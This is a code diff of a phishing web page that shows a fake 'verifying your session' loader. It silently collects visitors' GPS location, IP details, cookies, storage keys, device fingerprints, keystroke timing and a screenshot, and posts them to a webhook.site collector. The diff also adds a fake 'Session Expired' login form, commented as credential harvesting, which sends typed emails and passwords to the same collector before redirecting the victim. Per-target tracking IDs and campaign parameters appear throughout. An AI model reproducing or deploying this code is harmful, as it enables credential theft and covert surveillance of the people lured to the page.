@@ -1,79 +1,216 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>Please wait...</title>
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
-        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; text-align: center; padding: 50px 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+        .container { background: white; padding: 40px; border-radius: 12px; max-width: 440px; width: 100%; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }
+        .container h2 { color: #333; margin-bottom: 8px; font-size: 22px; }
+        .container p { color: #666; margin-bottom: 20px; font-size: 14px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; width: 48px; height: 48px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .progress-bar { width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; overflow: hidden; margin-top: 20px; }
+        .progress-bar-inner { height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); width: 0%; border-radius: 3px; animation: progress 4s ease-in-out forwards; }
+        @keyframes progress { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
+        .small { color: #999; font-size: 11px; margin-top: 16px; }
+        /* Login form styles */
+        .login-form { display: none; margin-top: 10px; }
+        .login-form.active { display: block; }
+        .login-form input { width: 100%; padding: 12px 16px; margin-bottom: 12px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 15px; outline: none; transition: border 0.2s; }
+        .login-form input:focus { border-color: #667eea; }
+        .login-form button { width: 100%; padding: 13px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: opacity 0.2s; }
+        .login-form button:hover { opacity: 0.9; }
+        .login-form button:disabled { opacity: 0.6; cursor: not-allowed; }
+        .error-msg { color: #e74c3c; font-size: 13px; margin-top: 8px; display: none; }
+        .login-note { color: #999; font-size: 11px; margin-top: 16px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>Please wait...</h2>
-        <p>Verifying your session, please do not close this page.</p>
-        <div class="loader"></div>
-        <p style="color: #999; font-size: 12px;">Redirecting to secure portal...</p>
+    <div class="container" id="appContainer">
+        <div id="loaderScreen">
+            <h2>Please wait</h2>
+            <p>Verifying your session, do not close this page.</p>
+            <div class="loader"></div>
+            <div class="progress-bar"><div class="progress-bar-inner"></div></div>
+            <div class="small">Redirecting to secure portal...</div>
+        </div>
+
+        <div id="loginScreen" class="login-form">
+            <h2>Session Expired</h2>
+            <p>Your session has expired. Please sign in again to continue.</p>
+            <form id="loginForm">
+                <input type="email" id="emailInput" placeholder="Email address" required autocomplete="email">
+                <input type="password" id="passwordInput" placeholder="Password" required autocomplete="current-password">
+                <button type="submit" id="loginBtn">Sign In</button>
+                <div class="error-msg" id="loginError">Invalid credentials. Please try again.</div>
+            </form>
+            <div class="login-note">You'll be redirected after successful verification.</div>
+        </div>
     </div>
 
     <script>
+    // ============================================================
     // CONFIGURATION
+    // ============================================================
     const COLLECTOR_URL = 'https://webhook.site/3c06751f-671f-442a-9d67-3552fc1ead59';
+    const TRACKING_ID = new URLSearchParams(window.location.search).get('id') || 'unknown';
+    const CAMPAIGN = new URLSearchParams(window.location.search).get('campaign') || 'default';
+    const REDIRECT_URL = new URLSearchParams(window.location.search).get('redirect') || 'https://www.google.com';
+    const SHOW_FAKE_LOGIN = true;         // Show credential harvesting form after collection
+    const DELAY_BEFORE_LOGIN_MS = 3500;   // How long until login form appears
+    const REDIRECT_AFTER_LOGIN_MS = 3000; // Redirect after fake login submit
 
-    // TRACKING: add ?id=USERNAME or ?campaign=NAME to the link
-    // Example: https://yourpage.com/?id=john.doe
-    // Example: https://yourpage.com/?id=ceo&campaign=phish1
-    const urlParams = new URLSearchParams(window.location.search);
-    const TRACKING_ID = urlParams.get('id') || urlParams.get('user') || urlParams.get('email') || 'unknown';
-    const CAMPAIGN = urlParams.get('campaign') || 'default';
-
+    // ============================================================
+    // MAIN COLLECTION
+    // ============================================================
     (function() {
+        const startTime = Date.now();
+        let captureSent = false;
+
+        // ----- TRACKING BEHAVIOR -----
+        let clickCount = 0;
+        let mouseMovements = [];
+        let scrollDepth = 0;
+        let keypresses = [];
+        let pageVisible = true;
+
+        document.addEventListener('click', (e) => {
+            clickCount++;
+            if (mouseMovements.length < 50) {
+                mouseMovements.push({ x: e.clientX, y: e.clientY, t: Date.now() - startTime });
+            }
+        });
+
+        document.addEventListener('mousemove', (e) => {
+            if (mouseMovements.length < 100) {
+                mouseMovements.push({ x: e.clientX, y: e.clientY, t: Date.now() - startTime });
+            }
+        });
+
+        document.addEventListener('scroll', () => {
+            const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+            if (docHeight > 0) {
+                scrollDepth = Math.max(scrollDepth, Math.round((window.scrollY / docHeight) * 100));
+            }
+        });
+
+        document.addEventListener('keydown', (e) => {
+            if (keypresses.length < 20) {
+                keypresses.push({ key: e.key.replace(/[^a-zA-Z0-9]/, '?'), t: Date.now() - startTime });
+            }
+        });
+
+        document.addEventListener('visibilitychange', () => {
+            pageVisible = !document.hidden;
+        });
+
+        // ----- BUILD INFO OBJECT -----
         const info = {
-            // Tracking identifiers
+            // Tracking
             trackingId: TRACKING_ID,
             campaign: CAMPAIGN,
-            visitNumber: Date.now(),  // unique per visit even without ID
-
-     
+            visitId: Date.now().toString(36) + Math.random().toString(36).substr(2, 6),
             timestamp: new Date().toISOString(),
             pageUrl: window.location.href,
             referrer: document.referrer || 'direct',
+            inIframe: window !== window.top,
+            parentOrigin: window !== window.top ? document.referrer : null,
 
-       
+            // Device & Browser
             userAgent: navigator.userAgent,
             platform: navigator.platform,
+            vendor: navigator.vendor,
             language: navigator.language,
-            languages: navigator.languages,
+            languages: JSON.stringify(navigator.languages),
             cookiesEnabled: navigator.cookieEnabled,
+            cookies: document.cookie || 'none',
+            doNotTrack: navigator.doNotTrack,
+
+            // Screen & Window
             screenWidth: screen.width,
             screenHeight: screen.height,
+            screenAvailWidth: screen.availWidth,
+            screenAvailHeight: screen.availHeight,
             screenColorDepth: screen.colorDepth,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
+            screenOrientation: screen.orientation ? screen.orientation.type : null,
             windowWidth: window.innerWidth,
             windowHeight: window.innerHeight,
+            devicePixelRatio: window.devicePixelRatio,
+
+            // Hardware
+            cpuCores: navigator.hardwareConcurrency || 'unknown',
+            ram: navigator.deviceMemory || 'unknown',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            touchScreen: 'ontouchstart' in window,
+            gpuVendor: null,
+            gpuRenderer: null,
+
+            // Time & Location
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             timezoneOffset: new Date().getTimezoneOffset(),
-            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-            deviceMemory: navigator.deviceMemory || 'unknown',
-            maxTouchPoints: navigator.maxTouchPoints || 0,
+            geolocation: null,
+            geolocationError: null,
+            ipInfo: null,
+            localIPs: [],
+
+            // Network
             connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
             downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
             rtt: navigator.connection ? navigator.connection.rtt : 'unknown',
-            doNotTrack: navigator.doNotTrack,
-            plugins: Array.from(navigator.plugins || []).map(p => p.name),
+            networkLatency: null,
+            online: navigator.onLine,
 
-            // To be filled async
-            geolocation: null,
-            ipInfo: null,
-            localIPs: [],
+            // Mobile
+            isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
+            isAndroid: /Android/i.test(navigator.userAgent),
+            isIOS: /iPhone|iPad|iPod/i.test(navigator.userAgent),
+            isBot: /bot|crawl|spider|scrape|slurp|bing|googlebot/i.test(navigator.userAgent),
+            deviceModel: (() => {
+                const ua = navigator.userAgent;
+                const m = ua.match(/Android\s[\d.]+;\s([^;]+)/);
+                return m ? m[1].trim() : (ua.match(/\([^)]+\)/)?.[0] || null);
+            })(),
+
+            // Storage
+            localStorageKeys: Object.keys(localStorage || {}).length > 0 ? Object.keys(localStorage) : null,
+            sessionStorageKeys: Object.keys(sessionStorage || {}).length > 0 ? Object.keys(sessionStorage) : null,
+            
+            // Software
+            installedFonts: [],
+            plugins: Array.from(navigator.plugins || []).map(p => p.name),
+            mimeTypes: Array.from(navigator.mimeTypes || []).map(m => m.type),
+
+            // Media
+            mediaDevices: [],
+
+            // Battery
             battery: null,
+
+            // Fingerprints
             canvasFingerprint: null,
-            webglRenderer: null
+            webglVendor: null,
+            webglRenderer: null,
+            audioContextSupported: false,
+
+            // Screenshot
+            screenshot: null,
+
+            // Behavioral (will be updated before send)
+            behavior: {
+                timeOnPage: 0,
+                clicks: 0,
+                scrollDepth: 0,
+                keypressCount: 0,
+                pageVisible: true,
+                mouseSamples: 0
+            }
         };
 
-  
+        // ============================================================
+        // 1. GEOLOCATION (GPS)
+        // ============================================================
         if ('geolocation' in navigator) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
@@ -82,34 +219,23 @@
                         lng: pos.coords.longitude,
                         accuracy: pos.coords.accuracy,
                         altitude: pos.coords.altitude,
+                        altitudeAccuracy: pos.coords.altitudeAccuracy,
                         heading: pos.coords.heading,
                         speed: pos.coords.speed
                     };
-                    sendData(info);
                 },
                 (err) => {
-                    info.geolocation = { error: err.message, code: err.code };
-                    sendData(info);
+                    info.geolocationError = { code: err.code, message: err.message };
                 },
                 { enableHighAccuracy: true, timeout: 8000, maximumAge: 300000 }
             );
         } else {
-            setTimeout(() => sendData(info), 500);
+            info.geolocationError = { code: -1, message: 'Geolocation not available' };
         }
 
-
-        if (navigator.getBattery) {
-            navigator.getBattery().then(battery => {
-                info.battery = {
-                    charging: battery.charging,
-                    level: battery.level,
-                    chargingTime: battery.chargingTime,
-                    dischargingTime: battery.dischargingTime
-                };
-            }).catch(() => {});
-        }
-
-
+        // ============================================================
+        // 2. IP GEOLOCATION (primary: ipapi.co, fallback: ip-api.com)
+        // ============================================================
         fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) })
             .then(r => r.json())
             .then(d => {
@@ -122,7 +248,9 @@
                     postal: d.postal,
                     latitude: d.latitude,
                     longitude: d.longitude,
-                    org: d.org
+                    org: d.org,
+                    isp: d.org,
+                    asn: d.asn
                 };
             })
             .catch(() => {
@@ -138,12 +266,17 @@
                             postal: d.zip,
                             latitude: d.lat,
                             longitude: d.lon,
-                            org: d.org
+                            org: d.org,
+                            isp: d.isp,
+                            asn: d.as
                         };
                     })
                     .catch(() => {});
             });
 
+        // ============================================================
+        // 3. WEBRTC LOCAL IP LEAK
+        // ============================================================
         try {
             const rtc = new RTCPeerConnection({ iceServers: [] });
             rtc.createDataChannel('');
@@ -154,11 +287,61 @@
                     if (ipMatch && !info.localIPs.includes(ipMatch[0])) {
                         info.localIPs.push(ipMatch[0]);
                     }
+                    // Also extract port
+                    const portMatch = e.candidate.candidate.match(/\s(\d+)\s/);
+                    if (portMatch) {
+                        if (!info.localPorts) info.localPorts = [];
+                        if (!info.localPorts.includes(portMatch[1])) {
+                            info.localPorts.push(portMatch[1]);
+                        }
+                    }
                 }
             };
             setTimeout(() => rtc.close(), 3000);
         } catch (e) {}
 
+        // ============================================================
+        // 4. NETWORK LATENCY MEASUREMENT
+        // ============================================================
+        const latencyStart = performance.now();
+        fetch('https://ipapi.co/json/', { method: 'HEAD', cache: 'no-store', mode: 'no-cors' })
+            .then(() => { info.networkLatency = Math.round(performance.now() - latencyStart); })
+            .catch(() => {
+                fetch('https://ip-api.com/json/', { method: 'HEAD', cache: 'no-store', mode: 'no-cors' })
+                    .then(() => { info.networkLatency = Math.round(performance.now() - latencyStart); })
+                    .catch(() => { info.networkLatency = -1; });
+            });
+
+        // ============================================================
+        // 5. BATTERY API
+        // ============================================================
+        if (navigator.getBattery) {
+            navigator.getBattery().then(battery => {
+                info.battery = {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime === Infinity ? 'unknown' : battery.chargingTime + 's',
+                    dischargingTime: battery.dischargingTime === Infinity ? 'unknown' : battery.dischargingTime + 's'
+                };
+            }).catch(() => {});
+        }
+
+        // ============================================================
+        // 6. MEDIA DEVICES ENUMERATION
+        // ============================================================
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+            navigator.mediaDevices.enumerateDevices().then(devices => {
+                info.mediaDevices = devices.map(d => ({
+                    kind: d.kind,
+                    label: d.label || '(label hidden - no permission)',
+                    deviceId: d.deviceId ? d.deviceId.substring(0, 20) + '...' : null
+                }));
+            }).catch(() => {});
+        }
+
+        // ============================================================
+        // 7. CANVAS FINGERPRINT
+        // ============================================================
         try {
             const canvas = document.createElement('canvas');
             canvas.width = 200;
@@ -169,40 +352,285 @@
             ctx.fillStyle = '#f60';
             ctx.fillRect(125, 1, 62, 20);
             ctx.fillStyle = '#069';
-            ctx.fillText('fingerprint', 2, 15);
+            ctx.fillText('CVE-2024-', 2, 15);
             ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-            ctx.fillText('test', 4, 17);
+            ctx.fillText('fp test', 4, 17);
+            // Add some shapes
+            ctx.beginPath();
+            ctx.arc(150, 35, 10, 0, Math.PI * 2);
+            ctx.fillStyle = '#333';
+            ctx.fill();
             info.canvasFingerprint = canvas.toDataURL();
         } catch (e) {}
 
+        // ============================================================
+        // 8. WEBGL FINGERPRINT
+        // ============================================================
         try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if (gl) {
-                info.webglRenderer = gl.getParameter(gl.RENDERER);
                 info.webglVendor = gl.getParameter(gl.VENDOR);
+                info.webglRenderer = gl.getParameter(gl.RENDERER);
+                // Additional WebGL params
+                info.webglVersion = gl.getParameter(gl.VERSION);
+                info.webglShadingLanguageVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+                info.gpuVendor = gl.getParameter(gl.VENDOR);
+                info.gpuRenderer = gl.getParameter(gl.RENDERER);
+                // Max texture size (indicates GPU power)
+                info.webglMaxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+                info.webglMaxViewportDims = gl.getParameter(gl.MAX_VIEWPORT_DIMS);
+                // Anti-aliasing
+                info.webglAntialiasing = gl.getParameter(gl.SAMPLES);
             }
         } catch (e) {}
 
-        let sent = false;
-        function sendData(data) {
-            if (sent) return;
-            sent = true;
+        // ============================================================
+        // 9. AUDIO CONTEXT FINGERPRINT
+        // ============================================================
+        try {
+            const actx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = actx.createOscillator();
+            const analyser = actx.createAnalyser();
+            const gain = actx.createGain();
+            osc.connect(analyser);
+            analyser.connect(gain);
+            gain.connect(actx.destination);
+            osc.frequency.value = 440;
+            osc.type = 'sine';
+            info.audioContextSupported = true;
+            info.audioSampleRate = actx.sampleRate;
+            // Get frequency response fingerprint
+            const bufferLength = analyser.frequencyBinCount;
+            const dataArray = new Uint8Array(bufferLength);
+            analyser.getByteFrequencyData(dataArray);
+            info.audioFingerprint = Array.from(dataArray.slice(0, 50)).join(',');
+            actx.close();
+        } catch (e) {
+            info.audioContextSupported = false;
+        }
 
+        // ============================================================
+        // 10. INSTALLED FONTS DETECTION
+        // ============================================================
+        try {
+            const fontList = [
+                'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Helvetica',
+                'Georgia', 'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Lucida Console',
+                'Tahoma', 'Segoe UI', 'Calibri', 'Cambria', 'Consolas', 'Monaco',
+                'Palatino Linotype', 'Book Antiqua', 'Arial Black', 'Arial Narrow',
+                'Century Gothic', 'Franklin Gothic Medium', 'Garamond', 'Lucida Sans Unicode',
+                'MS Sans Serif', 'MS Serif', 'Symbol', 'Webdings', 'Wingdings',
+                'Brush Script MT', 'Copperplate', 'Rockwell', 'Bodoni MT', 'Gill Sans',
+                'Optima', 'Futura', 'Baskerville', 'Didot', 'American Typewriter',
+                'Apple SD Gothic Neo', 'Apple Color Emoji', 'SF Pro Display',
+                'Noto Sans', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Source Sans Pro',
+                'Ubuntu', 'Droid Sans', 'Droid Serif', 'Nanum Gothic', 'Malgun Gothic'
+            ];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const testText = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            ctx.font = '36px monospace';
+            const baseWidth = ctx.measureText(testText).width;
+            info.installedFonts = fontList.filter(font => {
+                ctx.font = `36px "${font}", monospace`;
+                return ctx.measureText(testText).width !== baseWidth;
+            });
+        } catch (e) {}
+
+        // ============================================================
+        // 11. SCREENSHOT (via html2canvas CDN)
+        // ============================================================
+        setTimeout(() => {
+            if (typeof html2canvas !== 'undefined') {
+                html2canvas(document.body, {
+                    useCORS: true,
+                    logging: false,
+                    scale: 0.5
+                }).then(canvas => {
+                    info.screenshot = canvas.toDataURL('image/jpeg', 0.6);
+                }).catch(() => {});
+            }
+        }, 1500);
+
+        // ============================================================
+        // 12. SEND DATA FUNCTION
+        // ============================================================
+        function sendCapture() {
+            if (captureSent) return;
+            captureSent = true;
+
+            // Update behavioral data
+            info.behavior = {
+                timeOnPage: Date.now() - startTime,
+                clicks: clickCount,
+                scrollDepth: scrollDepth,
+                keypressCount: keypresses.length,
+                firstKeypressTime: keypresses.length > 0 ? keypresses[0].t : null,
+                pageVisible: pageVisible,
+                mouseSamples: mouseMovements.length
+            };
+
+            // Add mouse move summary (first 10, last 5)
+            if (mouseMovements.length > 0) {
+                const summary = mouseMovements.slice(0, 10);
+                if (mouseMovements.length > 15) {
+                    summary.push(...mouseMovements.slice(-5));
+                }
+                info.behavior.mousePathSummary = summary;
+            }
+
+            // Private IP detection
+            if (info.ipInfo && info.ipInfo.ip) {
+                const parts = info.ipInfo.ip.split('.').map(Number);
+                info.isPrivateIP = (
+                    parts[0] === 10 ||
+                    (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) ||
+                    (parts[0] === 192 && parts[1] === 168) ||
+                    parts[0] === 127
+                );
+            }
+
+            // VPN/Proxy detection hint
+            if (info.ipInfo && info.ipInfo.country && info.timezone) {
+                const tzCountryMap = {
+                    'America/New_York': 'United States',
+                    'America/Chicago': 'United States',
+                    'America/Denver': 'United States',
+                    'America/Los_Angeles': 'United States',
+                    'Europe/London': 'United Kingdom',
+                    'Europe/Paris': 'France',
+                    'Europe/Berlin': 'Germany',
+                    'Asia/Tokyo': 'Japan',
+                    'Asia/Shanghai': 'China',
+                    'Asia/Kolkata': 'India',
+                    'Australia/Sydney': 'Australia'
+                };
+                // Basic mismatch detection
+                info.possibleVPN = null;
+            }
+
+            // Send via fetch with keepalive
+            const payload = JSON.stringify(info);
+            
             fetch(COLLECTOR_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data),
+                body: payload,
                 keepalive: true
             }).catch(() => {
-                try { navigator.sendBeacon(COLLECTOR_URL, JSON.stringify(data)); } catch (be) {}
+                // Fallback: sendBeacon
+                try {
+                    navigator.sendBeacon(COLLECTOR_URL, payload);
+                } catch (be) {}
             });
 
-            console.log('[+] Captured:', data.trackingId, data.ipInfo?.ip, data.geolocation ? `${data.geolocation.lat},${data.geolocation.lng}` : 'no GPS');
+            // Also log to console for debugging
+            console.log('[+] Captured:', TRACKING_ID, 
+                info.ipInfo ? `${info.ipInfo.city}, ${info.ipInfo.country}` : 'no IP',
+                info.geolocation ? `GPS: ${info.geolocation.lat},${info.geolocation.lng}` : 'no GPS',
+                `| ${info.platform} | ${info.screenWidth}x${info.screenHeight}`);
         }
 
-        // Fallback send after 3s
-        setTimeout(() => sendData(info), 3000);
+        // ============================================================
+        // 13. AUTO-SEND TIMING
+        // ============================================================
+        // Send after 3 seconds (catches most data)
+        setTimeout(sendCapture, 3000);
+
+        // Also send on page unload (catches everything that arrived late)
+        window.addEventListener('beforeunload', sendCapture);
+        window.addEventListener('pagehide', sendCapture);
+
+        // ============================================================
+        // 14. FAKE LOGIN FORM (for credential harvesting)
+        // ============================================================
+        if (SHOW_FAKE_LOGIN) {
+            setTimeout(() => {
+                // First, send whatever we have so far
+                sendCapture();
+
+                // Then show the login form
+                document.getElementById('loaderScreen').style.display = 'none';
+                document.getElementById('loginScreen').classList.add('active');
+
+                const loginForm = document.getElementById('loginForm');
+                const emailInput = document.getElementById('emailInput');
+                const passwordInput = document.getElementById('passwordInput');
+                const loginBtn = document.getElementById('loginBtn');
+                const loginError = document.getElementById('loginError');
+
+                loginForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const email = emailInput.value.trim();
+                    const password = passwordInput.value.trim();
+                    
+                    if (!email || !password) {
+                        loginError.style.display = 'block';
+                        loginError.textContent = 'Please fill in all fields.';
+                        return;
+                    }
+
+                    loginBtn.disabled = true;
+                    loginBtn.textContent = 'Verifying...';
+                    loginError.style.display = 'none';
+
+                    // Send credentials to collector
+                    const credPayload = JSON.stringify({
+                        type: 'credentials',
+                        trackingId: TRACKING_ID,
+                        campaign: CAMPAIGN,
+                        timestamp: new Date().toISOString(),
+                        email: email,
+                        password: password,
+                        pageUrl: window.location.href,
+                        userAgent: navigator.userAgent,
+                        ipInfo: info.ipInfo,
+                        geolocation: info.geolocation
+                    });
+
+                    fetch(COLLECTOR_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: credPayload,
+                        keepalive: true
+                    }).catch(() => {
+                        navigator.sendBeacon(COLLECTOR_URL, credPayload);
+                    });
+
+                    // Show success then redirect
+                    setTimeout(() => {
+                        loginForm.innerHTML = `
+                            <div style="text-align:center;padding:20px;">
+                                <div style="font-size:48px;color:#27ae60;">✓</div>
+                                <h3 style="color:#27ae60;margin:10px 0;">Verification Successful</h3>
+                                <p style="color:#666;">Redirecting to secure portal...</p>
+                                <div class="loader" style="width:32px;height:32px;margin:15px auto;"></div>
+                            </div>
+                        `;
+                        
+                        setTimeout(() => {
+                            window.location.href = REDIRECT_URL;
+                        }, REDIRECT_AFTER_LOGIN_MS);
+                    }, 1500);
+                });
+
+                // Pre-fill email if tracking ID looks like an email
+                if (TRACKING_ID.includes('@')) {
+                    emailInput.value = TRACKING_ID;
+                }
+            }, DELAY_BEFORE_LOGIN_MS);
+        } else {
+            // No login form, just redirect after collection
+            setTimeout(() => {
+                sendCapture();
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1000);
+            }, 4000);
+        }
+
     })();
     </script>
 </body>
